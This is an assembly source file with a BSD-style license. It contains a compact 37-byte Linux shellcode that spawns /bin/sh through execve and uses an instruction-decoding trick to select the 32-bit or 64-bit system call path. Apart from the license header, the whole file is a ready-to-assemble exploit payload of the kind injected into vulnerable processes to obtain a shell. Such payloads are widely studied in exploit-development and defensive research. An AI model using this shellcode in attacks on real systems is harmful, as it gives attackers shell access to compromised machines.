;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;
; 37 byte execve("/bin//sh", NULL, 0);
;
; Tested on 32 and 64-bit versions of Linux
;
    bits    32

    xor     esi, esi    ; argv = 0
    mul     esi         ; eax = 0, edx = 0 
    push    edx         ; '\0'
    push    edx         ; null space
    push    edx         ; null space
    push    esp
    pop     ebx         ; ebx = "/bin//sh", 0
    push    ebx         ; save pointer to "/bin//sh", 0
    pop     edi         ; rdi="/bin//sh", 0
    mov     dword[edi+0], '/bin'
    mov     dword[edi+4], '//sh'
    inc     eax
    jnz     x32
    mov     al, 59      ; rax = sys_execve
    syscall
x32:
    xor     ecx, ecx    ; argv=NULL
    mov     al, 11      ; eax = sys_execve
    int     0x80
    
    

    
